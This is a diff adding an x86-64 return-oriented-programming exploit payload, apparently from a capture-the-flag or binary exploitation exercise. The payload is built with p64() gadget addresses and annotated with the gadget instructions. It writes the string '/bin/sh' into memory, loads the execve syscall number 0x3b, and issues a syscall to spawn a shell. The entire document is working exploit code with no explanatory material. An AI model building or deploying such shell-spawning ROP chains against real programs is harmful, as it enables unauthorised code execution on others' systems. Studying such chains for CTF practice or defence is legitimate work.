@@ -1,0 +1,35 @@
+payload = p64(0x4079d3)
+#0x00000000004079d3: pop rbx; ret; 
+payload += p64(0x435198)+p64(0x40125d)
+# 0x000000000040125d: pop rbp; ret; 
+payload += p64(0x435070)+p64(0x41835d)
+# 0x000000000041835d: mov rax, rbp; pop rbp; ret; 
+payload += p64(0x0)+p64(0x415ddc)
+# 0x0000000000415ddc: mov qword ptr [rbx + 0x40], rax; pop rbx; ret; 
+payload += p64(0x0)+p64(0x4079d3)
+# 0x00000000004079d3: pop rbx; ret; 
+payload += p64(0x435030)+p64(0x40125d)
+# 0x000000000040125d: pop rbp; ret; 
+payload += p64(0x68662f6e69622f)+p64(0x41835d)
+# 0x000000000041835d: mov rax, rbp; pop rbp; ret; 
+payload += p64(0x0)+p64(0x415ddc)
+# 0x0000000000415ddc: mov qword ptr [rbx + 0x40], rax; pop rbx; ret; 
+payload += p64(0x0)+p64(0x406022)
+# 0x0000000000406022: pop rsi; ret; 
+payload += p64(0x0)+p64(0x415d89)
+# 0x0000000000415d89: mov eax, dword ptr [rsp + 8]; mov rdx, rax; add rsp, 0x18; mov rax, rdx; pop rbx; pop rbp; pop r12; pop r13; ret; 
+payload += p64(0x0)+p64(0x0)+p64(0x0)+p64(0x0)+p64(0x0)+p64(0x0)+p64(0x0)+p64(0x40125d)
+# 0x000000000040125d: pop rbp; ret; 
+payload += p64(0x3b)+p64(0x41835e)
+# 0x000000000041835e: mov eax, ebp; pop rbp; ret; 
+payload += p64(0x0)+p64(0x404e19)
+# 0x0000000000404e19: pop rbx; pop rbp; ret; 
+payload += p64(0x0)+p64(0x4351c0)+p64(0x4051ad)
+# 0x00000000004051ad: pop r12; ret; 
+payload += p64(0x404e19)+p64(0x418133)
+# 0x418133: mov edi, dword ptr [rbp + 0x18] ; call r12
+payload += b''
+# 0x0000000000404e19: pop rbx; pop rbp; ret; 
+payload += p64(0x0)+p64(0x40f025)
+# 0x000000000040f025: syscall; 
+payload += b''
